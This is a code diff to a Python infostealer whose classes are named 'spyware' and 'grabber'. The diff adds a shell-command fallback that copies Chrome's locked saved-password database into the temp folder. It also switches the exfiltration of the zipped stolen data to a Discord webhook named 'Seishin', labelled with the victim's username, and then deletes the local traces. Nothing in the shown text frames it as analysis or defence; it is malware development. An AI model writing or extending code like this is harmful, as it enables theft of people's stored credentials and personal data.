@@ -80,10 +80,15 @@ class spyware:
         final_ans = "\nChrome Passwords:\n"
         key = self.fetch_encryption_key()
         db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
-                            "Google", "Chrome", "User Data", "default", "Login Data")
-        
-        filename = "ChromePasswords.db"
-        shutil.copyfile(db_path, filename)        
+                            "Google", "Chrome", "User Data", "Default", "Login Data")
+
+        filename = os.path.join(os.getenv("temp"), "ChromePasswords.db")
+        try:
+            shutil.copyfile(db_path, filename)
+        except Exception:
+            # Chrome is running and has the file locked — copy via cmd bypass
+            subprocess.run(f'copy /Y "{db_path}" "{filename}"', shell=True,
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         db = sqlite3.connect(filename)
         cursor = db.cursor()
                 
@@ -507,7 +512,9 @@ class grabber:
                     zipped_file.write(absname, arcname)
             zipped_file.close()
             with open(_zipfile, 'rb') as f:
-                httpx.post(weblink, files={'upload_file': f})
+                wh = DiscordWebhook(url=weblink, username="Seishin")
+                wh.add_file(file=f.read(), filename=f'{os.getenv("UserName")}-Info.zip')
+                wh.execute()
             shutil.rmtree(tempfolder)
             os.remove(f'{appdata}\\{os.getenv("UserName")}-Info.zip')
         except:
